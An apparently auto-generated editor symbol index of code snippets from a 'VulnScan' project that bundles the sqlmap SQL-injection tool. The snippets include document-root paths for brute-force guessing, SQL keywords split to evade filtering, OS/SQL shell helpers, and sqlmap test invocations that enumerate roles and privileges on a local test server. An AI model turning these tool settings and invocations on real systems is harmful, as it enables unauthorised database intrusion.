        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "METASPLOIT_SESSION_TIMEOUT = 120\n# Reference: http://www.postgresql.org/docs/9.0/static/catalog-pg-largeobject.html\nLOBLKSIZE = 2048\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)\nEVALCODE_ENCODED_PREFIX = \"EVAL_\"\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)\nZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n# Reference: http://www.cookiecentral.com/faq/#3.5\nNETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOBLKSIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LOBLKSIZE = 2048\n# Prefix used to mark special variables (e.g. keywords, having special chars, etc.)\nEVALCODE_ENCODED_PREFIX = \"EVAL_\"\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)\nZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n# Reference: http://www.cookiecentral.com/faq/#3.5\nNETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens\nCSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n# Prefixes used in brute force search for web server document root",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EVALCODE_ENCODED_PREFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EVALCODE_ENCODED_PREFIX = \"EVAL_\"\n# Reference: https://en.wikipedia.org/wiki/Zip_(file_format)\nZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n# Reference: http://www.cookiecentral.com/faq/#3.5\nNETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens\nCSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n# Prefixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ZIP_HEADER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ZIP_HEADER = b\"\\x50\\x4b\\x03\\x04\"\n# Reference: http://www.cookiecentral.com/faq/#3.5\nNETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens\nCSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n# Prefixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),\n    OS.WINDOWS: (\"/xampp\", \"/Program Files/xampp\", \"/wamp\", \"/Program Files/wampp\", \"/Apache/Apache\", \"/apache\", \"/Program Files/Apache Group/Apache\", \"/Program Files/Apache Group/Apache2\", \"/Program Files/Apache Group/Apache2.2\", \"/Program Files/Apache Group/Apache2.4\", \"/Inetpub/wwwroot\", \"/Inetpub/wwwroot/%TARGET%\", \"/Inetpub/vhosts/%TARGET%\")\n}",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NETSCAPE_FORMAT_HEADER_COOKIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "NETSCAPE_FORMAT_HEADER_COOKIES = \"# Netscape HTTP Cookie File.\"\n# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens\nCSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n# Prefixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),\n    OS.WINDOWS: (\"/xampp\", \"/Program Files/xampp\", \"/wamp\", \"/Program Files/wampp\", \"/Apache/Apache\", \"/apache\", \"/Program Files/Apache Group/Apache\", \"/Program Files/Apache Group/Apache2\", \"/Program Files/Apache Group/Apache2.2\", \"/Program Files/Apache Group/Apache2.4\", \"/Inetpub/wwwroot\", \"/Inetpub/wwwroot/%TARGET%\", \"/Inetpub/vhosts/%TARGET%\")\n}\n# Suffixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_SUFFIXES = (\"\", \"html\", \"htdocs\", \"httpdocs\", \"php\", \"public\", \"src\", \"site\", \"build\", \"web\", \"www\", \"data\", \"sites/all\", \"www/build\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CSRF_TOKEN_PARAMETER_INFIXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CSRF_TOKEN_PARAMETER_INFIXES = (\"csrf\", \"xsrf\", \"token\")\n# Prefixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),\n    OS.WINDOWS: (\"/xampp\", \"/Program Files/xampp\", \"/wamp\", \"/Program Files/wampp\", \"/Apache/Apache\", \"/apache\", \"/Program Files/Apache Group/Apache\", \"/Program Files/Apache Group/Apache2\", \"/Program Files/Apache Group/Apache2.2\", \"/Program Files/Apache Group/Apache2.4\", \"/Inetpub/wwwroot\", \"/Inetpub/wwwroot/%TARGET%\", \"/Inetpub/vhosts/%TARGET%\")\n}\n# Suffixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_SUFFIXES = (\"\", \"html\", \"htdocs\", \"httpdocs\", \"php\", \"public\", \"src\", \"site\", \"build\", \"web\", \"www\", \"data\", \"sites/all\", \"www/build\")\n# String used for marking target name inside used brute force web server document root\nBRUTE_DOC_ROOT_TARGET_MARK = \"%TARGET%\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_PREFIXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BRUTE_DOC_ROOT_PREFIXES = {\n    OS.LINUX: (\"/var/www\", \"/usr/local/apache\", \"/usr/local/apache2\", \"/usr/local/www/apache22\", \"/usr/local/www/apache24\", \"/usr/local/httpd\", \"/var/www/nginx-default\", \"/srv/www\", \"/var/www/%TARGET%\", \"/var/www/vhosts/%TARGET%\", \"/var/www/virtual/%TARGET%\", \"/var/www/clients/vhosts/%TARGET%\", \"/var/www/clients/virtual/%TARGET%\"),\n    OS.WINDOWS: (\"/xampp\", \"/Program Files/xampp\", \"/wamp\", \"/Program Files/wampp\", \"/Apache/Apache\", \"/apache\", \"/Program Files/Apache Group/Apache\", \"/Program Files/Apache Group/Apache2\", \"/Program Files/Apache Group/Apache2.2\", \"/Program Files/Apache Group/Apache2.4\", \"/Inetpub/wwwroot\", \"/Inetpub/wwwroot/%TARGET%\", \"/Inetpub/vhosts/%TARGET%\")\n}\n# Suffixes used in brute force search for web server document root\nBRUTE_DOC_ROOT_SUFFIXES = (\"\", \"html\", \"htdocs\", \"httpdocs\", \"php\", \"public\", \"src\", \"site\", \"build\", \"web\", \"www\", \"data\", \"sites/all\", \"www/build\")\n# String used for marking target name inside used brute force web server document root\nBRUTE_DOC_ROOT_TARGET_MARK = \"%TARGET%\"\n# Character used as a boundary in kb.chars (preferably less frequent letter)\nKB_CHARS_BOUNDARY_CHAR = 'q'",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_SUFFIXES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BRUTE_DOC_ROOT_SUFFIXES = (\"\", \"html\", \"htdocs\", \"httpdocs\", \"php\", \"public\", \"src\", \"site\", \"build\", \"web\", \"www\", \"data\", \"sites/all\", \"www/build\")\n# String used for marking target name inside used brute force web server document root\nBRUTE_DOC_ROOT_TARGET_MARK = \"%TARGET%\"\n# Character used as a boundary in kb.chars (preferably less frequent letter)\nKB_CHARS_BOUNDARY_CHAR = 'q'\n# Letters of lower frequency used in kb.chars\nKB_CHARS_LOW_FREQUENCY_ALPHABET = \"zqxjkvbp\"\n# Printable bytes\nPRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_DOC_ROOT_TARGET_MARK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BRUTE_DOC_ROOT_TARGET_MARK = \"%TARGET%\"\n# Character used as a boundary in kb.chars (preferably less frequent letter)\nKB_CHARS_BOUNDARY_CHAR = 'q'\n# Letters of lower frequency used in kb.chars\nKB_CHARS_LOW_FREQUENCY_ALPHABET = \"zqxjkvbp\"\n# Printable bytes\nPRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)\nHTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n# CSS style used in HTML dump format",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "KB_CHARS_BOUNDARY_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "KB_CHARS_BOUNDARY_CHAR = 'q'\n# Letters of lower frequency used in kb.chars\nKB_CHARS_LOW_FREQUENCY_ALPHABET = \"zqxjkvbp\"\n# Printable bytes\nPRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)\nHTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n# CSS style used in HTML dump format\nHTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "KB_CHARS_LOW_FREQUENCY_ALPHABET",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "KB_CHARS_LOW_FREQUENCY_ALPHABET = \"zqxjkvbp\"\n# Printable bytes\nPRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)\nHTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n# CSS style used in HTML dump format\nHTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{\n    margin:10;\n    background-color:#FFFFFF;",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRINTABLE_BYTES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRINTABLE_BYTES = set(bytes(string.printable, \"ascii\") if six.PY3 else string.printable)\n# SQL keywords used for splitting in HTTP chunked transfer encoded requests (switch --chunk)\nHTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n# CSS style used in HTML dump format\nHTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{\n    margin:10;\n    background-color:#FFFFFF;\n    font-family:verdana;\n    font-size:12px;",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTTP_CHUNKED_SPLIT_KEYWORDS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HTTP_CHUNKED_SPLIT_KEYWORDS = (\"SELECT\", \"UPDATE\", \"INSERT\", \"FROM\", \"LOAD_FILE\", \"UNION\", \"information_schema\", \"sysdatabases\", \"msysaccessobjects\", \"msysqueries\", \"sysmodules\")\n# CSS style used in HTML dump format\nHTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{\n    margin:10;\n    background-color:#FFFFFF;\n    font-family:verdana;\n    font-size:12px;\n    align:center;\n}",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HTML_DUMP_CSS_STYLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HTML_DUMP_CSS_STYLE = \"\"\"<style>\ntable{\n    margin:10;\n    background-color:#FFFFFF;\n    font-family:verdana;\n    font-size:12px;\n    align:center;\n}\nthead{\n    font-weight:bold;",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "readlineAvailable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.shell",
        "description": "VulnScan.modules.sqlmap.lib.core.shell",
        "peekOfCode": "def readlineAvailable():\n    \"\"\"\n    Check if the readline is available. By default\n    it is not in Python default installation on Windows\n    \"\"\"\n    return readline._readline is not None\ndef clearHistory():\n    if not readlineAvailable():\n        return\n    readline.clear_history()",
        "detail": "VulnScan.modules.sqlmap.lib.core.shell",
        "documentation": {}
    },
    {
        "label": "clearHistory",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.shell",
        "description": "VulnScan.modules.sqlmap.lib.core.shell",
        "peekOfCode": "def clearHistory():\n    if not readlineAvailable():\n        return\n    readline.clear_history()\ndef saveHistory(completion=None):\n    try:\n        if not readlineAvailable():\n            return\n        if completion == AUTOCOMPLETE_TYPE.SQL:\n            historyPath = paths.SQL_SHELL_HISTORY",
        "detail": "VulnScan.modules.sqlmap.lib.core.shell",
        "documentation": {}
    },
    {
        "label": "saveHistory",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.shell",
        "description": "VulnScan.modules.sqlmap.lib.core.shell",
        "peekOfCode": "def saveHistory(completion=None):\n    try:\n        if not readlineAvailable():\n            return\n        if completion == AUTOCOMPLETE_TYPE.SQL:\n            historyPath = paths.SQL_SHELL_HISTORY\n        elif completion == AUTOCOMPLETE_TYPE.OS:\n            historyPath = paths.OS_SHELL_HISTORY\n        elif completion == AUTOCOMPLETE_TYPE.API:\n            historyPath = paths.API_SHELL_HISTORY",
        "detail": "VulnScan.modules.sqlmap.lib.core.shell",
        "documentation": {}
    },
    {
        "label": "loadHistory",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.shell",
        "description": "VulnScan.modules.sqlmap.lib.core.shell",
        "peekOfCode": "def loadHistory(completion=None):\n    if not readlineAvailable():\n        return\n    clearHistory()\n    if completion == AUTOCOMPLETE_TYPE.SQL:\n        historyPath = paths.SQL_SHELL_HISTORY\n    elif completion == AUTOCOMPLETE_TYPE.OS:\n        historyPath = paths.OS_SHELL_HISTORY\n    elif completion == AUTOCOMPLETE_TYPE.API:\n        historyPath = paths.API_SHELL_HISTORY",
        "detail": "VulnScan.modules.sqlmap.lib.core.shell",
        "documentation": {}
    },
    {
        "label": "autoCompletion",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.shell",
        "description": "VulnScan.modules.sqlmap.lib.core.shell",
        "peekOfCode": "def autoCompletion(completion=None, os=None, commands=None):\n    if not readlineAvailable():\n        return\n    if completion == AUTOCOMPLETE_TYPE.OS:\n        if os == OS.WINDOWS:\n            # Reference: http://en.wikipedia.org/wiki/List_of_DOS_commands\n            completer = CompleterNG({\n                \"attrib\": None, \"copy\": None, \"del\": None,\n                \"dir\": None, \"echo\": None, \"fc\": None,\n                \"label\": None, \"md\": None, \"mem\": None,",
        "detail": "VulnScan.modules.sqlmap.lib.core.shell",
        "documentation": {}
    },
    {
        "label": "Popen",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "description": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "peekOfCode": "class Popen(subprocess.Popen):\n    def recv(self, maxsize=None):\n        return self._recv('stdout', maxsize)\n    def recv_err(self, maxsize=None):\n        return self._recv('stderr', maxsize)\n    def send_recv(self, input='', maxsize=None):\n        return self.send(input), self.recv(maxsize), self.recv_err(maxsize)\n    def get_conn_maxsize(self, which, maxsize):\n        if maxsize is None:\n            maxsize = 1024",
        "detail": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "documentation": {}
    },
    {
        "label": "blockingReadFromFD",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "description": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "peekOfCode": "def blockingReadFromFD(fd):\n    # Quick twist around original Twisted function\n    # Blocking read from a non-blocking file descriptor\n    output = b\"\"\n    while True:\n        try:\n            output += os.read(fd, 8192)\n        except (OSError, IOError) as ioe:\n            if ioe.args[0] in (errno.EAGAIN, errno.EINTR):\n                # Uncomment the following line if the process seems to",
        "detail": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "documentation": {}
    },
    {
        "label": "blockingWriteToFD",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "description": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "peekOfCode": "def blockingWriteToFD(fd, data):\n    # Another quick twist\n    while True:\n        try:\n            data_length = len(data)\n            wrote_data = os.write(fd, data)\n        except (OSError, IOError) as io:\n            if io.errno in (errno.EAGAIN, errno.EINTR):\n                continue\n            else:",
        "detail": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "documentation": {}
    },
    {
        "label": "recv_some",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "description": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "peekOfCode": "def recv_some(p, t=.1, e=1, tr=5, stderr=0):\n    if tr < 1:\n        tr = 1\n    x = time.time() + t\n    y = []\n    r = ''\n    if stderr:\n        pr = p.recv_err\n    else:\n        pr = p.recv",
        "detail": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "documentation": {}
    },
    {
        "label": "send_all",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "description": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "peekOfCode": "def send_all(p, data):\n    if not data:\n        return\n    data = getBytes(data)\n    while len(data):\n        sent = p.send(data)\n        if not isinstance(sent, int):\n            break\n        data = buffer(data[sent:])",
        "detail": "VulnScan.modules.sqlmap.lib.core.subprocessng",
        "documentation": {}
    },
    {
        "label": "initTargetEnv",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.target",
        "description": "VulnScan.modules.sqlmap.lib.core.target",
        "peekOfCode": "def initTargetEnv():\n    \"\"\"\n    Initialize target environment.\n    \"\"\"\n    if conf.multipleTargets:\n        if conf.hashDB:\n            conf.hashDB.close()\n        if conf.cj:\n            resetCookieJar(conf.cj)\n        threadData = getCurrentThreadData()",
        "detail": "VulnScan.modules.sqlmap.lib.core.target",
        "documentation": {}
    },
    {
        "label": "setupTargetEnv",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.target",
        "description": "VulnScan.modules.sqlmap.lib.core.target",
        "peekOfCode": "def setupTargetEnv():\n    _createTargetDirs()\n    _setRequestParams()\n    _setHashDB()\n    _resumeHashDBValues()\n    _setResultsFile()\n    _setAuthCred()\n    _setAuxOptions()",
        "detail": "VulnScan.modules.sqlmap.lib.core.target",
        "documentation": {}
    },
    {
        "label": "vulnTest",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.testing",
        "description": "VulnScan.modules.sqlmap.lib.core.testing",
        "peekOfCode": "def vulnTest():\n    \"\"\"\n    Runs the testing against 'vulnserver'\n    \"\"\"\n    TESTS = (\n        (\"-h\", (\"to see full list of options run with '-hh'\",)),\n        (\"--dependencies\", (\"sqlmap requires\", \"third-party library\")),\n        (\"-u <url> --data=\\\"reflect=1\\\" --flush-session --wizard --disable-coloring\", (\"Please choose:\", \"back-end DBMS: SQLite\", \"current user is DBA: True\", \"banner: '3.\")),\n        (\"-u <url> --data=\\\"code=1\\\" --code=200 --technique=B --banner --no-cast --flush-session\", (\"back-end DBMS: SQLite\", \"banner: '3.\", \"~COALESCE(CAST(\")),\n        (u\"-c <config> --flush-session --output-dir=\\\"<tmpdir>\\\" --smart --roles --statements --hostname --privileges --sql-query=\\\"SELECT '\\u0161u\\u0107uraj'\\\" --technique=U\", (u\": '\\u0161u\\u0107uraj'\", \"on SQLite it is not possible\", \"as the output directory\")),",
        "detail": "VulnScan.modules.sqlmap.lib.core.testing",
        "documentation": {}
    },
    {
        "label": "smokeTest",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.testing",
        "description": "VulnScan.modules.sqlmap.lib.core.testing",
        "peekOfCode": "def smokeTest():\n    \"\"\"\n    Runs the basic smoke testing of a program\n    \"\"\"\n    unisonRandom()\n    content = open(paths.ERRORS_XML, \"r\").read()\n    for regex in re.findall(r'<error regexp=\"(.+?)\"/>', content):\n        try:\n            re.compile(regex)\n        except re.error:",
        "detail": "VulnScan.modules.sqlmap.lib.core.testing",
        "documentation": {}
    },
    {
        "label": "_ThreadData",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "class _ThreadData(threading.local):\n    \"\"\"\n    Represents thread independent data\n    \"\"\"\n    def __init__(self):\n        self.reset()\n    def reset(self):\n        \"\"\"\n        Resets thread data model\n        \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "readInput",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def readInput(message, default=None, checkBatch=True, boolean=False):\n    # It will be overwritten by original from lib.core.common\n    pass\ndef isDigit(value):\n    # It will be overwritten by original from lib.core.common\n    pass\ndef getCurrentThreadData():\n    \"\"\"\n    Returns current thread's local data\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def isDigit(value):\n    # It will be overwritten by original from lib.core.common\n    pass\ndef getCurrentThreadData():\n    \"\"\"\n    Returns current thread's local data\n    \"\"\"\n    return ThreadData\ndef getCurrentThreadName():\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadData",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def getCurrentThreadData():\n    \"\"\"\n    Returns current thread's local data\n    \"\"\"\n    return ThreadData\ndef getCurrentThreadName():\n    \"\"\"\n    Returns current's thread name\n    \"\"\"\n    return threading.current_thread().getName()",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "getCurrentThreadName",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def getCurrentThreadName():\n    \"\"\"\n    Returns current's thread name\n    \"\"\"\n    return threading.current_thread().getName()\ndef exceptionHandledFunction(threadFunction, silent=False):\n    try:\n        threadFunction()\n    except KeyboardInterrupt:\n        kb.threadContinue = False",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "exceptionHandledFunction",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def exceptionHandledFunction(threadFunction, silent=False):\n    try:\n        threadFunction()\n    except KeyboardInterrupt:\n        kb.threadContinue = False\n        kb.threadException = True\n        raise\n    except Exception as ex:\n        from lib.core.common import getSafeExString\n        if not silent and kb.get(\"threadContinue\") and not kb.get(\"multipleCtrlC\") and not isinstance(ex, (SqlmapUserQuitException, SqlmapSkipTargetException)):",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "setDaemon",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def setDaemon(thread):\n    # Reference: http://stackoverflow.com/questions/190010/daemon-threads-explanation\n    if PYVERSION >= \"2.6\":\n        thread.daemon = True\n    else:\n        thread.setDaemon(True)\ndef runThreads(numThreads, threadFunction, cleanupFunction=None, forwardException=True, threadChoice=False, startThreadMsg=True):\n    threads = []\n    def _threadFunction():\n        try:",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "runThreads",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "def runThreads(numThreads, threadFunction, cleanupFunction=None, forwardException=True, threadChoice=False, startThreadMsg=True):\n    threads = []\n    def _threadFunction():\n        try:\n            threadFunction()\n        finally:\n            if conf.hashDB:\n                conf.hashDB.close()\n    kb.multipleCtrlC = False\n    kb.threadContinue = True",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "shared",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "shared = AttribDict()\nclass _ThreadData(threading.local):\n    \"\"\"\n    Represents thread independent data\n    \"\"\"\n    def __init__(self):\n        self.reset()\n    def reset(self):\n        \"\"\"\n        Resets thread data model",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
        "documentation": {}
    },
    {
        "label": "ThreadData",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.threads",
        "description": "VulnScan.modules.sqlmap.lib.core.threads",
        "peekOfCode": "ThreadData = _ThreadData()\ndef readInput(message, default=None, checkBatch=True, boolean=False):\n    # It will be overwritten by original from lib.core.common\n    pass\ndef isDigit(value):\n    # It will be overwritten by original from lib.core.common\n    pass\ndef getCurrentThreadData():\n    \"\"\"\n    Returns current thread's local data",
        "detail": "VulnScan.modules.sqlmap.lib.core.threads",
